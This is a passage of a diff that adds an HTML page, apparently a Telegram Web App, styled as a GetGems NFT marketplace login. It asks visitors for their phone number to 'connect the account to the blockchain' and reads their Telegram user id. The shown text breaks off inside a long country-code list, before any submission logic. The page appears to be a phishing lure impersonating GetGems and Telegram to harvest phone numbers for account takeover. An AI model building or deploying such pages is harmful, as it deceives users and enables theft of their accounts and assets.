@@ -1,0 +1,1371 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Авторизация - GetGems</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(0, 122, 255, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(90, 200, 250, 0.15) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .auth-container {
+            max-width: 440px;
+            width: 100%;
+            background: rgba(20, 20, 30, 0.6);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border-radius: 28px;
+            padding: 40px 32px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+            position: relative;
+            z-index: 1;
+            animation: fadeIn 0.6s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logos-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 32px;
+        }
+
+        .logo-wrapper {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .logo-wrapper::before {
+            content: '';
+            position: absolute;
+            inset: -2px;
+            border-radius: 50%;
+            padding: 2px;
+            background: linear-gradient(135deg, rgba(0, 122, 255, 0.3), rgba(90, 200, 250, 0.3));
+            -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            -webkit-mask-composite: xor;
+            mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+            mask-composite: exclude;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .logo-wrapper:hover::before {
+            opacity: 1;
+        }
+
+        .logo-wrapper svg {
+            width: 40px;
+            height: 40px;
+            filter: drop-shadow(0 4px 12px rgba(0, 122, 255, 0.3));
+        }
+
+        .logos-arrow {
+            font-size: 24px;
+            color: rgba(255, 255, 255, 0.3);
+            font-weight: 300;
+        }
+
+        .auth-title {
+            font-size: 24px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 12px;
+            color: #ffffff;
+            letter-spacing: -0.3px;
+        }
+
+        .auth-subtitle {
+            font-size: 15px;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        .auth-subtitle .highlight {
+            color: #007AFF;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 8px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .country-select {
+            width: 100%;
+            padding: 16px 18px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1.5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            color: #fff;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+        }
+
+        .country-select:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(0, 122, 255, 0.4);
+        }
+
+        .country-select:focus {
+            outline: none;
+            border-color: #007AFF;
+            box-shadow: 0 0 0 4px rgba(0, 122, 255, 0.15);
+        }
+
+        .country-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .country-flag {
+            font-size: 20px;
+            animation: scaleIn 0.3s ease-out;
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0.8);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+
+        .country-code {
+            font-weight: 600;
+        }
+
+        .phone-input-container {
+            display: flex;
+            gap: 8px;
+            width: 100%;
+            box-sizing: border-box;
+            min-width: 0; /* Предотвращает переполнение flex элементов */
+        }
+
+        .country-code-input {
+            width: 90px;
+            min-width: 70px;
+            padding: 16px 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1.5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 500;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            text-align: center;
+            box-sizing: border-box;
+            flex-shrink: 0;
+        }
+
+        .country-code-input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        .country-code-input:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(0, 122, 255, 0.4);
+        }
+
+        .country-code-input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.08);
+            border-color: #007AFF;
+            box-shadow: 0 0 0 4px rgba(0, 122, 255, 0.15);
+        }
+
+        .phone-input {
+            flex: 1;
+            min-width: 0; /* Предотвращает переполнение flex элементов */
+            padding: 16px 18px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1.5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 500;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            box-sizing: border-box;
+        }
+
+        .phone-input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        .phone-input:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(0, 122, 255, 0.4);
+        }
+
+        .phone-input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.08);
+            border-color: #007AFF;
+            box-shadow: 0 0 0 4px rgba(0, 122, 255, 0.15);
+        }
+
+        /* Прогресс-бар под полем ввода */
+        .progress-container {
+            margin-top: 12px;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(90deg, #007AFF, #5AC8FA);
+            border-radius: 10px;
+            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-bar::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% {
+                left: -100%;
+            }
+            100% {
+                left: 200%;
+            }
+        }
+
+        .progress-text {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 8px;
+            text-align: right;
+            transition: color 0.3s ease;
+            display: none; /* Скрыт по требованию */
+        }
+
+        .progress-text.complete {
+            color: #5AC8FA;
+            font-weight: 600;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 32px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 16px 24px;
+            border: none;
+            border-radius: 16px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-cancel {
+            background: rgba(255, 255, 255, 0.05);
+            color: #007AFF;
+            border: 1.5px solid rgba(0, 122, 255, 0.3);
+        }
+
+        .btn-cancel:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(0, 122, 255, 0.5);
+            transform: translateY(-1px);
+        }
+
+        .btn-cancel:active {
+            transform: translateY(0);
+        }
+
+        .btn-next {
+            background: linear-gradient(135deg, #007AFF 0%, #0051D5 100%);
+            color: white;
+            box-shadow: 0 8px 24px rgba(0, 122, 255, 0.35);
+            border: 1px solid rgba(0, 122, 255, 0.2);
+        }
+
+        .btn-next::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.6s ease;
+        }
+
+        .btn-next:hover::before {
+            left: 100%;
+        }
+
+        .btn-next:hover {
+            box-shadow: 0 12px 32px rgba(0, 122, 255, 0.45);
+            transform: translateY(-2px);
+        }
+
+        .btn-next:active {
+            transform: translateY(0);
+        }
+
+        .btn-next:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Модальное окно выбора страны */
+        .country-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0);
+            backdrop-filter: blur(0px);
+            -webkit-backdrop-filter: blur(0px);
+            z-index: 1000;
+            transition: background 0.3s ease, backdrop-filter 0.3s ease;
+        }
+
+        .country-modal.show {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .country-modal.visible {
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+        }
+
+        @keyframes modalSlideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.97);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .country-modal-content {
+            background: rgba(20, 20, 30, 0.95);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border-radius: 24px;
+            width: 100%;
+            max-width: 500px;
+            max-height: 80vh;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+            display: flex;
+            flex-direction: column;
+            animation: modalSlideUp 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .country-modal-header {
+            padding: 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .country-modal-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #ffffff;
+        }
+
+        .country-modal-close {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.05);
+            border: none;
+            color: #fff;
+            font-size: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .country-modal-close:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .country-search {
+            padding: 16px 24px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .country-search input {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1.5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 15px;
+            transition: all 0.3s ease;
+        }
+
+        .country-search input::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        .country-search input:focus {
+            outline: none;
+            border-color: #007AFF;
+            box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.15);
+        }
+
+        .country-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px;
+        }
+
+        .country-list-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .country-list-item:hover {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .country-list-item-flag {
+            font-size: 24px;
+            width: 32px;
+            text-align: center;
+        }
+
+        .country-list-item-info {
+            flex: 1;
+        }
+
+        .country-list-item-name {
+            font-size: 15px;
+            color: #fff;
+            font-weight: 500;
+        }
+
+        .country-list-item-code {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-left: auto;
+        }
+
+        @media (max-width: 480px) {
+            .auth-container {
+                padding: 32px 20px;
+                max-width: 100%;
+            }
+
+            .logos-container {
+                gap: 20px;
+            }
+
+            .logo-wrapper {
+                width: 64px;
+                height: 64px;
+            }
+
+            .logo-wrapper svg {
+                width: 36px;
+                height: 36px;
+            }
+
+            .country-modal-content {
+                max-height: 90vh;
+            }
+
+            .phone-input-container {
+                gap: 6px;
+            }
+
+            .country-code-input {
+                width: 75px;
+                min-width: 65px;
+                padding: 14px 8px;
+                font-size: 15px;
+            }
+
+            .phone-input {
+                padding: 14px 12px;
+                font-size: 15px;
+            }
+
+            .input-wrapper {
+                width: 100%;
+                box-sizing: border-box;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="logos-container">
+            <div class="logo-wrapper">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="url(#telegram-gradient)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M2 17L12 22L22 17" stroke="url(#telegram-gradient)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M2 12L12 17L22 12" stroke="url(#telegram-gradient)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <defs>
+                        <linearGradient id="telegram-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" stop-color="#38AEEB"/>
+                            <stop offset="100%" stop-color="#279AD1"/>
+                        </linearGradient>
+                    </defs>
+                </svg>
+            </div>
+
+            <div class="logos-arrow">→</div>
+
+            <div class="logo-wrapper">
+                <svg viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M14.0179 0C14.0179 7.74185 7.74185 14.0179 0 14.0179C0 6.276 6.276 0 14.0179 0ZM14.0179 28.0357C6.276 28.0357 0 21.7597 0 14.0179C7.74185 14.0179 14.0179 20.2939 14.0179 28.0357ZM28.0357 14.0179C28.0357 21.7597 21.7597 28.0357 14.0179 28.0357C14.0179 20.2939 20.2939 14.0179 28.0357 14.0179ZM26.8675 1.16818C26.8675 7.61969 21.6375 12.8497 15.186 12.8497C15.186 6.39817 20.416 1.16818 26.8675 1.16818Z" fill="url(#getgems-gradient)"/>
+                    <defs>
+                        <linearGradient id="getgems-gradient" x1="0" y1="0" x2="28" y2="28" gradientUnits="userSpaceOnUse">
+                            <stop offset="0%" stop-color="#007AFF"/>
+                            <stop offset="100%" stop-color="#5AC8FA"/>
+                        </linearGradient>
+                    </defs>
+                </svg>
+            </div>
+        </div>
+
+        <h1 class="auth-title">Войдите, чтобы подключить аккаунт к блокчейну</h1>
+        <p class="auth-subtitle">
+            для <span class="highlight">GetGems</span> и <span class="highlight">NFT Marketplace</span>.<br>
+            Введите свой <strong>номер телефона</strong> в международном формате.
+        </p>
+
+        <form id="authForm">
+            <div class="form-group">
+                <label class="form-label">Страна</label>
+                <div class="country-select" tabindex="0" id="countrySelect">
+                    <div class="country-info">
+                        <span class="country-flag" id="countryFlag">🇷🇺</span>
+                        <span class="country-name" id="countryName">Россия</span>
+                        <span class="country-code" id="countryCode">(+7)</span>
+                    </div>
+                    <span>›</span>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Номер телефона</label>
+                <div class="input-wrapper">
+                    <div class="phone-input-container">
+                        <input type="tel" class="country-code-input" id="countryCodeInput" placeholder="+7" inputmode="numeric" maxlength="4">
+                        <input type="tel" class="phone-input" id="phoneInput" placeholder="999 123 45 67" inputmode="numeric">
+                    </div>
+                </div>
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="progress-text" id="progressText">Введите номер</div>
+            </div>
+
+            <div class="button-group">
+                <button type="button" class="btn btn-cancel" id="cancelBtn">Отмена</button>
+                <button type="submit" class="btn btn-next" id="nextBtn">Далее</button>
+            </div>
+        </form>
+    </div>
+
+    <!-- Модальное окно выбора страны -->
+    <div class="country-modal" id="countryModal">
+        <div class="country-modal-content">
+            <div class="country-modal-header">
+                <h2 class="country-modal-title">Выберите страну</h2>
+                <button class="country-modal-close" id="closeModal">×</button>
+            </div>
+            <div class="country-search">
+                <input type="text" id="countrySearchInput" placeholder="Поиск страны...">
+            </div>
+            <div class="country-list" id="countryList"></div>
+        </div>
+    </div>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        let currentUserId = null;
+        if (tg.initDataUnsafe?.user?.id) {
+            currentUserId = String(tg.initDataUnsafe.user.id);
+        }
+
+        // База данных стран с примерами номеров (полный список всех стран)
+        const countries = [
+            { code: '7', name: 'Россия', flag: '🇷🇺', example: '+7 999 123 45 67', minLength: 10, maxLength: 10 },
+            { code: '380', name: 'Украина', flag: '🇺🇦', example: '+380 99 123 4567', minLength: 9, maxLength: 9 },
+            { code: '375', name: 'Беларусь', flag: '🇧🇾', example: '+375 29 123 45 67', minLength: 9, maxLength: 9 },
+            { code: '1', name: 'США/Канада', flag: '🇺🇸', example: '+1 234 567 8900', minLength: 10, maxLength: 10 },
+            { code: '44', name: 'Великобритания', flag: '🇬🇧', example: '+44 20 1234 5678', minLength: 10, maxLength: 10 },
+            { code: '98', name: 'Иран', flag: '🇮🇷', example: '+98 912 345 6789', minLength: 10, maxLength: 10 },
+            { code: '49', name: 'Германия', flag: '🇩🇪', example: '+49 151 12345678', minLength: 10, maxLength: 11 },
+            { code: '33', name: 'Франция', flag: '🇫🇷', example: '+33 6 12 34 56 78', minLength: 9, maxLength: 9 },
+            { code: '39', name: 'Италия', flag: '🇮🇹', example: '+39 345 123 4567', minLength: 10, maxLength: 10 },
+            { code: '34', name: 'Испания', flag: '🇪🇸', example: '+34 612 34 56 78', minLength: 9, maxLength: 9 },
+            { code: '48', name: 'Польша', flag: '🇵🇱', example: '+48 512 345 678', minLength: 9, maxLength: 9 },
+            { code: '90', name: 'Турция', flag: '🇹🇷', example: '+90 532 123 45 67', minLength: 10, maxLength: 10 },
+            { code: '86', name: 'Китай', flag: '🇨🇳', example: '+86 138 0013 8000', minLength: 11, maxLength: 11 },
+            { code: '81', name: 'Япония', flag: '🇯🇵', example: '+81 90 1234 5678', minLength: 10, maxLength: 10 },
+            { code: '82', name: 'Южная Корея', flag: '🇰🇷', example: '+82 10 1234 5678', minLength: 10, maxLength: 10 },
+            { code: '91', name: 'Индия', flag: '🇮🇳', example: '+91 98765 43210', minLength: 10, maxLength: 10 },
+            { code: '55', name: 'Бразилия', flag: '🇧🇷', example: '+55 11 91234 5678', minLength: 11, maxLength: 11 },
+            { code: '52', name: 'Мексика', flag: '🇲🇽', example: '+52 55 1234 5678', minLength: 10, maxLength: 10 },
+            { code: '77', name: 'Казахстан', flag: '🇰🇿', example: '+77 7 123 45 67', minLength: 10, maxLength: 10 },
+            { code: '998', name: 'Узбекистан', flag: '🇺🇿', example: '+998 90 123 45 67', minLength: 9, maxLength: 9 },
+            { code: '996', name: 'Киргизия', flag: '🇰🇬', example: '+996 555 12 34 56', minLength: 9, maxLength: 9 },
+            { code: '992', name: 'Таджикистан', flag: '🇹🇯', example: '+992 90 123 45 67', minLength: 9, maxLength: 9 },
+            { code: '994', name: 'Азербайджан', flag: '🇦🇿', example: '+994 50 123 45 67', minLength: 9, maxLength: 9 },
+            { code: '374', name: 'Армения', flag: '🇦🇲', example: '+374 91 123456', minLength: 8, maxLength: 8 },
+            { code: '995', name: 'Грузия', flag: '🇬🇪', example: '+995 555 12 34 56', minLength: 9, maxLength: 9 },
+            { code: '31', name: 'Нидерланды', flag: '🇳🇱', example: '+31 6 12345678', minLength: 9, maxLength: 9 },
+            { code: '32', name: 'Бельгия', flag: '🇧🇪', example: '+32 470 12 34 56', minLength: 9, maxLength: 9 },
+            { code: '41', name: 'Швейцария', flag: '🇨🇭', example: '+41 79 123 45 67', minLength: 9, maxLength: 9 },
+            { code: '43', name: 'Австрия', flag: '🇦🇹', example: '+43 664 123456', minLength: 9, maxLength: 9 },
+            { code: '46', name: 'Швеция', flag: '🇸🇪', example: '+46 70 123 45 67', minLength: 9, maxLength: 9 },
+            { code: '47', name: 'Норвегия', flag: '🇳🇴', example: '+47 412 34 567', minLength: 8, maxLength: 8 },
+            { code: '45', name: 'Дания', flag: '🇩🇰', example: '+45 20 12 34 56', minLength: 8, maxLength: 8 },
+            { code: '358', name: 'Финляндия', flag: '🇫🇮', example: '+358 50 123 4567', minLength: 9, maxLength: 9 },
+            { code: '351', name: 'Португалия', flag: '🇵🇹', example: '+351 912 345 678', minLength: 9, maxLength: 9 },
+            { code: '30', name: 'Греция', flag: '🇬🇷', example: '+30 694 123 4567', minLength: 10, maxLength: 10 },
+            { code: '40', name: 'Румыния', flag: '🇷🇴', example: '+40 712 345 678', minLength: 9, maxLength: 9 },
+            { code: '36', name: 'Венгрия', flag: '🇭🇺', example: '+36 20 123 4567', minLength: 9, maxLength: 9 },
+            { code: '420', name: 'Чехия', flag: '🇨🇿', example: '+420 601 123 456', minLength: 9, maxLength: 9 },
+            { code: '421', name: 'Словакия', flag: '🇸🇰', example: '+421 912 123 456', minLength: 9, maxLength: 9 },
+            { code: '385', name: 'Хорватия', flag: '🇭🇷', example: '+385 91 123 4567', minLength: 9, maxLength: 9 },
+            { code: '386', name: 'Словения', flag: '🇸🇮', example: '+386 40 123 456', minLength: 8, maxLength: 8 },
+            { code: '353', name: 'Ирландия', flag: '🇮🇪', example: '+353 85 123 4567', minLength: 9, maxLength: 9 },
+            { code: '61', name: 'Австралия', flag: '🇦🇺', example: '+61 412 345 678', minLength: 9, maxLength: 9 },
+            { code: '64', name: 'Новая Зеландия', flag: '🇳🇿', example: '+64 21 123 4567', minLength: 9, maxLength: 9 },
+            { code: '27', name: 'ЮАР', flag: '🇿🇦', example: '+27 82 123 4567', minLength: 9, maxLength: 9 },
+            { code: '20', name: 'Египет', flag: '🇪🇬', example: '+20 100 123 4567', minLength: 10, maxLength: 10 },
+            { code: '971', name: 'ОАЭ', flag: '🇦🇪', example: '+971 50 123 4567', minLength: 9, maxLength: 9 },
+            { code: '966', name: 'Саудовская Аравия', flag: '🇸🇦', example: '+966 50 123 4567', minLength: 9, maxLength: 9 },
+            { code: '974', name: 'Катар', flag: '🇶🇦', example: '+974 3312 3456', minLength: 8, maxLength: 8 },
+            { code: '965', name: 'Кувейт', flag: '🇰🇼', example: '+965 5012 3456', minLength: 8, maxLength: 8 },
+            { code: '973', name: 'Бахрейн', flag: '🇧🇭', example: '+973 3612 3456', minLength: 8, maxLength: 8 },
+            { code: '968', name: 'Оман', flag: '🇴🇲', example: '+968 9212 3456', minLength: 8, maxLength: 8 },
+            { code: '961', name: 'Ливан', flag: '🇱🇧', example: '+961 3 123 456', minLength: 8, maxLength: 8 },
+            { code: '962', name: 'Иордания', flag: '🇯🇴', example: '+962 7 9123 4567', minLength: 9, maxLength: 9 },
+            { code: '972', name: 'Израиль', flag: '🇮🇱', example: '+972 50 123 4567', minLength: 9, maxLength: 9 },
+            { code: '964', name: 'Ирак', flag: '🇮🇶', example: '+964 790 123 4567', minLength: 10, maxLength: 10 },
+            { code: '963', name: 'Сирия', flag: '🇸🇾', example: '+963 933 123 456', minLength: 9, maxLength: 9 },
+            { code: '60', name: 'Малайзия', flag: '🇲🇾', example: '+60 12 345 6789', minLength: 9, maxLength: 9 },
+            { code: '65', name: 'Сингапур', flag: '🇸🇬', example: '+65 9123 4567', minLength: 8, maxLength: 8 },
+            { code: '66', name: 'Таиланд', flag: '🇹🇭', example: '+66 81 234 5678', minLength: 9, maxLength: 9 },
+            { code: '84', name: 'Вьетнам', flag: '🇻🇳', example: '+84 91 234 5678', minLength: 9, maxLength: 9 },
+            { code: '62', name: 'Индонезия', flag: '🇮🇩', example: '+62 812 345 6789', minLength: 10, maxLength: 10 },
+            { code: '63', name: 'Филиппины', flag: '🇵🇭', example: '+63 917 123 4567', minLength: 10, maxLength: 10 },
+            { code: '880', name: 'Бангладеш', flag: '🇧🇩', example: '+880 1712 345678', minLength: 10, maxLength: 10 },
+            { code: '92', name: 'Пакистан', flag: '🇵🇰', example: '+92 300 1234567', minLength: 10, maxLength: 10 },
+            { code: '93', name: 'Афганистан', flag: '🇦🇫', example: '+93 70 123 4567', minLength: 9, maxLength: 9 },
+            { code: '94', name: 'Шри-Ланка', flag: '🇱🇰', example: '+94 71 234 5678', minLength: 9, maxLength: 9 },
+            { code: '95', name: 'Мьянма', flag: '🇲🇲', example: '+95 9 123 456 789', minLength: 10, maxLength: 10 },
+            { code: '212', name: 'Марокко', flag: '🇲🇦', example: '+212 612 345678', minLength: 9, maxLength: 9 },
+            { code: '213', name: 'Алжир', flag: '🇩🇿', example: '+213 551 23 45 67', minLength: 9, maxLength: 9 },
+            { code: '216', name: 'Тунис', flag: '🇹🇳', example: '+216 20 123 456', minLength: 8, maxLength: 8 },
+            { code: '218', name: 'Ливия', flag: '🇱🇾', example: '+218 91 234 5678', minLength: 9, maxLength: 9 },
+            { code: '249', name: 'Судан', flag: '🇸🇩', example: '+249 912 345 678', minLength: 9, maxLength: 9 },
+            { code: '251', name: 'Эфиопия', flag: '🇪🇹', example: '+251 911 234 567', minLength: 9, maxLength: 9 },
+            { code: '254', name: 'Кения', flag: '🇰🇪', example: '+254 712 123456', minLength: 9, maxLength: 9 },
+            { code: '255', name: 'Танзания', flag: '🇹🇿', example: '+255 712 123 456', minLength: 9, maxLength: 9 },
+            { code: '256', name: 'Уганда', flag: '🇺🇬', example: '+256 712 123456', minLength: 9, maxLength: 9 },
+            { code: '233', name: 'Гана', flag: '🇬🇭', example: '+233 24 123 4567', minLength: 9, maxLength: 9 },
+            { code: '234', name: 'Нигерия', flag: '🇳🇬', example: '+234 802 123 4567', minLength: 10, maxLength: 10 },
+            { code: '237', name: 'Камерун', flag: '🇨🇲', example: '+237 6 12 34 56 78', minLength: 9, maxLength: 9 },
+            { code: '225', name: 'Кот-д\'Ивуар', flag: '🇨🇮', example: '+225 07 12 34 56 78', minLength: 10, maxLength: 10 },
+            { code: '221', name: 'Сенегал', flag: '🇸🇳', example: '+221 77 123 45 67', minLength: 9, maxLength: 9 },
+            { code: '223', name: 'Мали', flag: '🇲🇱', example: '+223 65 12 34 56', minLength: 8, maxLength: 8 },
+            { code: '226', name: 'Буркина-Фасо', flag: '🇧🇫', example: '+226 70 12 34 56', minLength: 8, maxLength: 8 },
+            { code: '227', name: 'Нигер', flag: '🇳🇪', example: '+227 90 12 34 56', minLength: 8, maxLength: 8 },
+            { code: '228', name: 'Того', flag: '🇹🇬', example: '+228 90 12 34 56', minLength: 8, maxLength: 8 },
+            { code: '229', name: 'Бенин', flag: '🇧🇯', example: '+229 90 12 34 56', minLength: 8, maxLength: 8 },
+            { code: '230', name: 'Маврикий', flag: '🇲🇺', example: '+230 5 123 4567', minLength: 8, maxLength: 8 },
+            { code: '261', name: 'Мадагаскар', flag: '🇲🇬', example: '+261 32 12 345 67', minLength: 9, maxLength: 9 },
+            { code: '257', name: 'Бурунди', flag: '🇧🇮', example: '+257 79 12 34 56', minLength: 8, maxLength: 8 },
+            { code: '250', name: 'Руанда', flag: '🇷🇼', example: '+250 788 123 456', minLength: 9, maxLength: 9 },
+            { code: '258', name: 'Мозамбик', flag: '🇲🇿', example: '+258 82 123 4567', minLength: 9, maxLength: 9 },
+            { code: '260', name: 'Замбия', flag: '🇿🇲', example: '+260 96 123 4567', minLength: 9, maxLength: 9 },
+            { code: '263', name: 'Зимбабве', flag: '🇿🇼', example: '+263 71 123 4567', minLength: 9, maxLength: 9 },
+            { code: '264', name: 'Намибия', flag: '🇳🇦', example: '+264 81 123 4567', minLength: 9, maxLength: 9 },
+            { code: '265', name: 'Малави', flag: '🇲🇼', example: '+265 991 23 45 67', minLength: 9, maxLength: 9 },
+            { code: '266', name: 'Лесото', flag: '🇱🇸', example: '+266 5 123 4567', minLength: 8, maxLength: 8 },
+            { code: '267', name: 'Ботсвана', flag: '🇧🇼', example: '+267 71 123 456', minLength: 8, maxLength: 8 },
+            { code: '268', name: 'Свазиленд', flag: '🇸🇿', example: '+268 7612 3456', minLength: 8, maxLength: 8 },
+            { code: '269', name: 'Коморы', flag: '🇰🇲', example: '+269 321 23 45', minLength: 7, maxLength: 7 },
+            { code: '290', name: 'Остров Святой Елены', flag: '🇸🇭', example: '+290 1234', minLength: 4, maxLength: 4 },
+            { code: '291', name: 'Эритрея', flag: '🇪🇷', example: '+291 7 123 456', minLength: 7, maxLength: 7 },
+            { code: '297', name: 'Аруба', flag: '🇦🇼', example: '+297 560 1234', minLength: 7, maxLength: 7 },
+            { code: '298', name: 'Фарерские острова', flag: '🇫🇴', example: '+298 123456', minLength: 6, maxLength: 6 },
+            { code: '299', name: 'Гренландия', flag: '🇬🇱', example: '+299 12 34 56', minLength: 6, maxLength: 6 },
